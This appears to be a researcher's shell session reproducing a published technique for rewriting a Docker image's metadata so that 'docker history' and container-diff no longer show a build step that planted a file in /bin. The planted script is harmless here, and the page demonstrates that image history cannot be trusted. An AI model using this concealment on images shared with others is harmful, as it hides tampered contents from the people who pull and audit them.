# Docker Image History Modification

ref : https://www.justinsteven.com/posts/2021/02/14/docker-image-history-modification/

```shell
$ docker build -t mrtc0/test-evil:latest .
Sending build context to Docker daemon  3.072kB
Step 1/2 : FROM alpine:latest
 ---> a24bb4013296
Step 2/2 : RUN touch /test.txt && echo -e "#!/bin/sh\necho test" > /bin/test
 ---> Running in aa21e6cbdaba
Removing intermediate container aa21e6cbdaba
 ---> 102e947f3e88
Successfully built 102e947f3e88
Successfully tagged mrtc0/test-evil:latest

$ docker save mrtc0/test-evil:latest -o evilimage.tar
$ mkdir extract
$ tar -C extract -xf evilimage.tar
$ cp extract/102e947f3e88d95f26cd07d33123f611ef516e732fb6bf6c0768461861a3f836.json metadata.org.json

$ # edit extract/102e947f3e88d95f26cd07d33123f611ef516e732fb6bf6c0768461861a3f836.json

$ diff <(jq . extract/102e947f3e88d95f26cd07d33123f611ef516e732fb6bf6c0768461861a3f836.json) <(jq . metadata.org.json)
44c44
<       "touch /test.txt"
---
>       "touch /test.txt && echo -e \"#!/bin/sh\\necho test\" > /bin/test"
67c67
<       "created_by": "/bin/sh -c touch /test.txt"
---
>       "created_by": "/bin/sh -c touch /test.txt && echo -e \"#!/bin/sh\\necho test\" > /bin/test"

$ tar -C extract -cf test_modified.tar .
$ docker load -i test_modified.tar
The image mrtc0/test-evil:latest already exists, renaming the old one with ID sha256:102e947f3e88d95f26cd07d33123f611ef516e732fb6bf6c0768461861a3f836 to empty string
Loaded image: mrtc0/test-evil:latest

$ docker history mrtc0/test-evil:latest
IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT
35925821f9bb   5 minutes ago   /bin/sh -c touch /test.txt                      20B
<missing>      8 months ago    /bin/sh -c #(nop)  CMD ["/bin/sh"]              0B
<missing>      8 months ago    /bin/sh -c #(nop) ADD file:c92c248239f8c7b9b…   5.57MB

$ container-diff diff daemon://mrtc0/test:latest daemon://mrtc0/test-evil:latest --type=history

-----History-----

Docker history lines found only in mrtc0/test:latest: None

Docker history lines found only in mrtc0/test-evil:latest: None

$ docker run --rm -it mrtc0/test:latest sh
/ # cat /bin/test
cat: can't open '/bin/test': No such file or directory

$ docker run --rm -it mrtc0/test-evil:latest sh
/ # cat /bin/test
#!/bin/sh
echo test
```
